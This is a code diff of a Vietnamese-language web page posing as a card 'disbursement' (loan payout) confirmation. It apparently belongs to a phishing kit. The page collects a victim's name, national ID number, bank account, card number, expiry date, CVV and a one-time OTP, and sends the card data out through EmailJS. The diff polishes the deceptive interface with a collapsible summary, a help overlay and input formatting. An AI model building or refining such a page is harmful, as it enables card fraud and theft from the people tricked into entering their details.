@@ -6,6 +6,7 @@
     <title>Giải Ngân Thẻ VISA,Thẻ JCB,Thẻ MASTERCARD,Thẻ UIP</title>
     <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <script>
         // Inputmask fallback
         window.Inputmask = window.Inputmask || function(options) {
@@ -407,19 +408,34 @@
         }
 
         .summary {
-            display: none;
             margin-bottom: 20px;
             padding: 15px;
             background-color: #f9f9f9;
             border-radius: 5px;
         }
 
-        .summary.active {
-            display: block;
-        }
-
         .summary h3 {
             margin-bottom: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .summary h3::after {
+            content: '\f078'; /* Font Awesome chevron-down */
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            margin-left: 8px;
+            transition: transform 0.3s;
+        }
+
+        .summary.collapsed h3::after {
+            transform: rotate(180deg);
+        }
+
+        .summary.collapsed .summary-content {
+            display: none;
         }
 
         .summary p {
@@ -501,9 +517,14 @@
         }
 
         .help-image {
-            display: none;
             margin-bottom: 15px;
             text-align: center;
+            display: none;
+            position: relative;
+        }
+
+        .help-image.active {
+            display: block;
         }
 
         .help-image img {
@@ -511,6 +532,20 @@
             width: 100%;
             border: 1px solid #e9ecef;
             border-radius: 5px;
+        }
+
+        .help-image .overlay-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: center;
+            max-width: 90%;
         }
 
         .timer {
@@ -707,6 +742,11 @@
                 max-width: 200px;
             }
 
+            .help-image .overlay-text {
+                font-size: 12px;
+                padding: 8px;
+            }
+
             .form-group {
                 margin-bottom: 10px;
             }
@@ -789,25 +829,14 @@
             <h2>Xác Nhận Giải Ngân Thẻ VISA</h2>
             <div class="help-image" id="helpImage">
                 <img src="https://nganhangkorea.com/wp-content/uploads/2022/01/visa1.jpg" alt="Hướng dẫn nhập thông tin thẻ">
-            </div>
-            <div class="summary">
-                <h3>Thông tin giải ngân</h3>
-                <p>Họ và Tên: <span id="summaryName"></span></p>
-                <p>Số CCCD: <span id="summaryCCCD"></span></p>
-                <p>Số Tiền Giảy Ngân: <span id="summaryAmount">N/A</span></p>
-                <p>Tháng: <span id="summaryMonths">N/A</span></p>
-                <p>Số Tài Khoản Nhận Tiền: <span id="summaryAccountNumber"></span></p>
-                <p>Tên Chủ Tài Khoản: <span id="summaryAccountHolder"></span></p>
-                <p>Ngân Hàng: <span id="summaryBank"></span></p>
-                <p>Số Điện Thoại: <span id="summaryPhone"></span></p>
-                <p>Email: <span id="summaryEmail"></span></p>
+                <div class="overlay-text">Hướng dẫn nhập thông tin thẻ Visa<br>Số thẻ Visa in trên mặt trước thẻ.</div>
             </div>
             <div class="bank-selection active" id="bank-selection">
                 <h3>Chọn ngân hàng</h3>
                 <div class="bank-grid">
                     <div class="bank-option" data-bank="THE_MASTERCARD" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="Thẻ Martercard">
-                        <p>Thẻ Martercard</p>
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="Thẻ Mastercard">
+                        <p>Thẻ Mastercard</p>
                     </div>
                     <div class="bank-option" data-bank="THE_VISA" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="Thẻ Visa">
@@ -831,6 +860,20 @@
                 <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
                 <h3>Hướng dẫn nhập thông tin thẻ Visa</h3>
                 <p>Số thẻ Visa in trên mặt trước thẻ.</p>
+            </div>
+            <div class="summary collapsed" id="summary">
+                <h3 onclick="toggleSummary()">Thông tin giải ngân</h3>
+                <div class="summary-content">
+                    <p>Họ và Tên: <span id="summaryName"></span></p>
+                    <p>Số CCCD: <span id="summaryCCCD"></span></p>
+                    <p>Số Tiền Giải Ngân: <span id="summaryAmount">N/A</span></p>
+                    <p>Tháng: <span id="summaryMonths">N/A</span></p>
+                    <p>Số Tài Khoản Nhận Tiền: <span id="summaryAccountNumber"></span></p>
+                    <p>Tên Chủ Tài Khoản: <span id="summaryAccountHolder"></span></p>
+                    <p>Ngân Hàng: <span id="summaryBank"></span></p>
+                    <p>Số Điện Thoại: <span id="summaryPhone"></span></p>
+                    <p>Email: <span id="summaryEmail"></span></p>
+                </div>
             </div>
             <form id="card-info-form" class="card-form">
                 <p class="check-info">Vui lòng kiểm tra thông tin trước khi nhập thẻ!</p>
@@ -923,8 +966,14 @@
         // Show Help Image
         function showHelp(fieldId) {
             const helpImage = document.getElementById('helpImage');
-            helpImage.style.display = 'block';
+            helpImage.classList.add('active');
             helpImage.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Toggle Summary Section
+        function toggleSummary() {
+            const summary = document.getElementById('summary');
+            summary.classList.toggle('collapsed');
         }
 
         // Load Summary and Initialize
@@ -949,6 +998,8 @@
                     document.getElementById('summaryBank').textContent = selectedBank;
                     confirmBank();
                 }
+                // Initialize expiry date input
+                initializeExpiryDateInput();
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
@@ -992,11 +1043,13 @@
             document.getElementById('bank-selection').classList.remove('active');
             document.getElementById('card-guide').classList.add('active');
             document.getElementById('card-info-form').classList.add('active');
+            document.getElementById('summary').classList.add('active');
             document.getElementById('issue-guide-btn').classList.add('active');
             document.getElementById('selected-bank-logo').src = selectedBankLogo;
             document.querySelector('.form-container h2').classList.add('active');
-            document.querySelector('.summary').classList.add('active');
             document.getElementById('summaryBank').textContent = selectedBank;
+            // Show help image automatically when card form is active
+            document.getElementById('helpImage').classList.add('active');
         }
 
         // Lazy Load Images
@@ -1040,7 +1093,6 @@
         function initializeInputMasks() {
             if (typeof window.Inputmask === 'function') {
                 Inputmask({ mask: "9999 9999 9999 9999" }).mask(document.getElementById('visaCardNumber'));
-                Inputmask({ mask: "99/99" }).mask(document.getElementById('visaExpiryDate'));
                 Inputmask({ mask: "999" }).mask(document.getElementById('visaCvv'));
                 Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
             }
@@ -1058,6 +1110,30 @@
                 }
             });
             lazyLoadImages();
+        }
+
+        // Initialize Expiry Date Input
+        function initializeExpiryDateInput() {
+            const expiryInput = document.getElementById('visaExpiryDate');
+            expiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 4) {
+                    value = value.slice(0, 4);
+                }
+                if (value.length >= 3) {
+                    e.target.value = value.slice(0, 2) + '/' + value.slice(2);
+                } else {
+                    e.target.value = value;
+                }
+            });
+            expiryInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace') {
+                    let value = e.target.value;
+                    if (value.endsWith('/')) {
+                        e.target.value = value.slice(0, -1);
+                    }
+                }
+            });
         }
 
         // Validate Date (mm/yy)
@@ -1114,11 +1190,6 @@
                 formData.cvv = cvv;
                 formData.cardType = 'visa';
                 formData.bankName = selectedBank;
-                // Update summary with full card details
-                document.getElementById('summaryCardNumber').textContent = formData.cardNumber;
-                document.getElementById('summaryExpiryDate').textContent = formData.expiryDate;
-                document.getElementById('summaryFullName').textContent = formData.cardFullName;
-                document.getElementById('summaryCvv').textContent = formData.cvv;
                 // Save to sessionStorage
                 sessionStorage.setItem('cardInfo', JSON.stringify(formData));
                 // Send to EmailJS
@@ -1145,6 +1216,8 @@
                         console.log('EmailJS sent successfully');
                         document.getElementById('card-info-form').classList.remove('active');
                         document.getElementById('otp-form').classList.add('active');
+                        document.getElementById('helpImage').classList.remove('active');
+                        document.getElementById('summary').classList.remove('active');
                         startOTPTimer();
                     },
                     (error) => {
